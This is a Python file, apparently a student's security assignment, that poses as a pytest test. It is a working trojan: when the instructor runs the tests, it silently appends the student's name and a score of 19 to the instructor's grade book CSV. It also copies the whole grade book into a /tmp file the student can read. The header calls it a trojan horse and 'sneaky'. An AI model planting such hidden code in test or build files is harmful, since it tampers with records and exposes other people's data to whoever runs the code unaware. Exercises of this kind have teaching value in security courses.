"""
Aaron Harkrider
November 8th, 2018

Build a trojan horse that gains access to a file on cyber.anderson.edu.
The file under attack is the grade book for this assignment.

Sneaky sneaky
"""

import os


def test_mytest():
    """
    When Dr. Tarplee run's py.test on the assignment this py file will run and insert my entry into the grade book.

    """

    # the entry I want to insert into the grade book
    me = "Aaron Harkrider,19\n"

    # path to the grade book file
    path = "home/kmtarplee2/grades.csv"

    # Boolean to check if I have already inserted my entry into the file to avoid placing a duplicate
    complete = True
    with open(path, "r") as reading_grades:
        if me not in reading_grades.read():
            complete = False

    # If This is not an entry for me then append my entry to the file
    if not complete:
        with open("home/kmtarplee2/grades.csv", "a+") as grades:
            grades.write(me)

    # piping the cat out from the grade book into a temp file where I can look at it
    os.system("cat home/kmtarplee2/grades.csv > /tmp/awharkrider_files")


# Standard boilerplate to call the main function, if executed
if __name__ == '__main__':
    test_mytest()
